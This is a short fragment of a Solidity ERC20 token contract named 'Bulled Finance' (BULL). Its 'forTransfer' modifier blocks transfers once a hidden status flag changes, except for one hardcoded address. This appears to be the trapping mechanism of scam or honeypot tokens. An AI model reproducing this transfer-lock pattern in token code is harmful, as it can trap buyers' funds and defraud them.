...
contract TestForkedToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokena_totalSupply;
    uint256 private _tokena_status = 0;
    uint256 public stakingPoolaStatus = 0;

    string private _tokena_name;
    string private _tokena_symbol;

    address private _poolaAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokena_name = "Bulled Finance";
        _tokena_symbol = "BULL";
        _tokena_totalSupply = 10000000 * 10 ** 18;
        _balances[msg.sender] = _tokena_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolaAddress || _tokena_status == 0);
        _;
    }
